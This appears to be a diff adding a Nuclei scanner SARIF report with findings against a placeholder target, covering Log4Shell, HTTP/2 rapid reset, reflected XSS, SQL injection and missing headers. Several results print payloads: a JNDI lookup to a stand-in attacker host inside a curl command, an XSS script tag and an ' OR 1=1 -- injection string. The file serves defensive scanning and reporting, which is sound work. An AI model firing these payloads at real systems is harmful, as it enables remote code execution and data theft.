@@ -1,0 +1,345 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Nuclei",
+          "fullName": "Nuclei - Fast and Customizable Vulnerability Scanner",
+          "version": "3.1.0",
+          "informationUri": "https://github.com/projectdiscovery/nuclei",
+          "rules": [
+            {
+              "id": "CVE-2021-44228",
+              "name": "Apache Log4j RCE (Log4Shell)",
+              "shortDescription": {
+                "text": "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, parameters, etc. do not protect against attacker-controlled LDAP and other JNDI related endpoints."
+              },
+              "fullDescription": {
+                "text": "Apache Log4j2 vulnerable to remote code execution via JNDI lookup. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": ["cve", "cve2021", "rce", "log4j", "injection"],
+                "severity": "critical",
+                "cwe": "CWE-502",
+                "cvss-score": "10.0",
+                "technologies": ["java", "log4j"]
+              }
+            },
+            {
+              "id": "CVE-2023-44487",
+              "name": "HTTP/2 Rapid Reset Attack",
+              "shortDescription": {
+                "text": "HTTP/2 rapid reset attack allows denial of service by creating and immediately canceling HTTP/2 streams."
+              },
+              "fullDescription": {
+                "text": "The HTTP/2 protocol allows a denial of service (server resource consumption) because request processing costs are not properly tracked when streams are rapidly created and reset."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "tags": ["cve", "cve2023", "dos", "http2"],
+                "severity": "high",
+                "cwe": "CWE-400",
+                "cvss-score": "7.5",
+                "technologies": ["http2", "nginx"]
+              }
+            },
+            {
+              "id": "xss-reflected-basic",
+              "name": "Reflected Cross-Site Scripting",
+              "shortDescription": {
+                "text": "A reflected cross-site scripting vulnerability was found in the target application."
+              },
+              "fullDescription": {
+                "text": "User-controlled input is reflected in the response without proper sanitization, allowing execution of arbitrary JavaScript code."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "tags": ["xss", "reflected", "owasp"],
+                "severity": "medium",
+                "cwe": "CWE-79",
+                "cvss-score": "6.1",
+                "technologies": ["php", "apache"]
+              }
+            },
+            {
+              "id": "misconfigured-headers",
+              "name": "Missing Security Headers",
+              "shortDescription": {
+                "text": "The application is missing one or more security headers."
+              },
+              "fullDescription": {
+                "text": "Security headers such as X-Content-Type-Options, X-Frame-Options, or Content-Security-Policy are not set, potentially exposing users to various attacks."
+              },
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "properties": {
+                "tags": ["headers", "misconfig", "security-headers"],
+                "severity": "info",
+                "cwe": "CWE-693",
+                "cvss-score": "0.0",
+                "technologies": ["nginx"]
+              }
+            },
+            {
+              "id": "sql-injection-error-based",
+              "name": "SQL Injection - Error Based",
+              "shortDescription": {
+                "text": "An SQL injection vulnerability was detected based on database error messages."
+              },
+              "fullDescription": {
+                "text": "The application is vulnerable to SQL injection through user-controllable input. Database error messages indicate that input is being used in SQL queries without proper sanitization."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": ["sqli", "injection", "owasp", "database"],
+                "severity": "critical",
+                "cwe": "CWE-89",
+                "cvss-score": "9.8",
+                "technologies": ["mysql", "php"]
+              }
+            }
+          ]
+        }
+      },
+      "artifacts": [
+        {
+          "location": {
+            "uri": "https://target-app.example.com/login"
+          },
+          "description": {
+            "text": "Target web application"
+          }
+        },
+        {
+          "location": {
+            "uri": "https://target-app.example.com/api/users"
+          },
+          "description": {
+            "text": "API endpoint"
+          }
+        },
+        {
+          "location": {
+            "uri": "https://target-app.example.com/search"
+          },
+          "description": {
+            "text": "Search functionality"
+          }
+        }
+      ],
+      "results": [
+        {
+          "ruleId": "CVE-2021-44228",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "Log4Shell vulnerability detected - remote code execution possible via JNDI injection in log4j header. Target: https://target-app.example.com/login"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "https://target-app.example.com/login"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 1,
+                  "snippet": {
+                    "text": "Header: X-Api-Response: ${jndi:ldap://attacker.com/exploit}"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "log4shell-001"
+          },
+          "properties": {
+            "matched-at": "https://target-app.example.com/login",
+            "template-id": "CVE-2021-44228",
+            "template-path": "nuclei-templates/cves/2021/CVE-2021-44228.yaml",
+            "curl-command": "curl -s -H 'X-Api-Response: ${jndi:ldap://attacker.com/exploit}' https://target-app.example.com/login",
+            "severity": "critical"
+          }
+        },
+        {
+          "ruleId": "CVE-2023-44487",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "HTTP/2 rapid reset vulnerability detected. Server is vulnerable to HTTP/2 CONTINUATION frame flood attack. Target: https://target-app.example.com/api/users"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "https://target-app.example.com/api/users"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 1,
+                  "snippet": {
+                    "text": "HTTP/2 stream 15 reset after CONTINUATION flood"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "http2-rapid-reset-001"
+          },
+          "properties": {
+            "matched-at": "https://target-app.example.com/api/users",
+            "template-id": "CVE-2023-44487",
+            "template-path": "nuclei-templates/cves/2023/CVE-2023-44487.yaml",
+            "severity": "high"
+          }
+        },
+        {
+          "ruleId": "xss-reflected-basic",
+          "ruleIndex": 2,
+          "level": "warning",
+          "message": {
+            "text": "Reflected XSS found in search parameter. Payload <script>alert(1)</script> was reflected in response. Target: https://target-app.example.com/search"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "https://target-app.example.com/search"
+                },
+                "region": {
+                  "startLine": 42,
+                  "endLine": 42,
+                  "snippet": {
+                    "text": "<div class=\"results\">Search results for: <script>alert(1)</script></div>"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "xss-reflected-001"
+          },
+          "properties": {
+            "matched-at": "https://target-app.example.com/search?q=<script>alert(1)</script>",
+            "template-id": "xss-reflected-basic",
+            "template-path": "nuclei-templates/vulnerabilities/generic/xss-reflected-basic.yaml",
+            "severity": "medium"
+          }
+        },
+        {
+          "ruleId": "misconfigured-headers",
+          "ruleIndex": 3,
+          "level": "note",
+          "message": {
+            "text": "Missing security headers: X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, Strict-Transport-Security. Target: https://target-app.example.com/login"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "https://target-app.example.com/login"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 1,
+                  "snippet": {
+                    "text": "HTTP/1.1 200 OK\\r\\nServer: nginx/1.18.0"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "headers-missing-001"
+          },
+          "properties": {
+            "matched-at": "https://target-app.example.com/login",
+            "template-id": "misconfigured-headers",
+            "template-path": "nuclei-templates/misconfiguration/missing-security-headers.yaml",
+            "severity": "info"
+          }
+        },
+        {
+          "ruleId": "sql-injection-error-based",
+          "ruleIndex": 4,
+          "level": "error",
+          "message": {
+            "text": "SQL injection detected via error-based technique. MySQL error message returned for input: ' OR 1=1 --. Target: https://target-app.example.com/search"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "https://target-app.example.com/search"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 1,
+                  "snippet": {
+                    "text": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "sqli-error-001"
+          },
+          "properties": {
+            "matched-at": "https://target-app.example.com/search?q=' OR 1=1 --",
+            "template-id": "sql-injection-error-based",
+            "template-path": "nuclei-templates/vulnerabilities/generic/sql-injection-error-based.yaml",
+            "severity": "critical"
+          }
+        },
+        {
+          "ruleId": "CVE-2021-44228",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "Log4Shell vulnerability detected - remote code execution possible via JNDI injection. Second instance found on API endpoint. Target: https://target-app.example.com/api/users"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "https://target-app.example.com/api/users"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 1,
+                  "snippet": {
+                    "text": "Response contained: ${jndi:ldap://attacker.com/exploit}"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "log4shell-002"
+          },
+          "properties": {
+            "matched-at": "https://target-app.example.com/api/users",
+            "template-id": "CVE-2021-44228",
+            "template-path": "nuclei-templates/cves/2021/CVE-2021-44228.yaml",
+            "severity": "critical"
+          }
+        }
+      ]
+    }
+  ]
+}
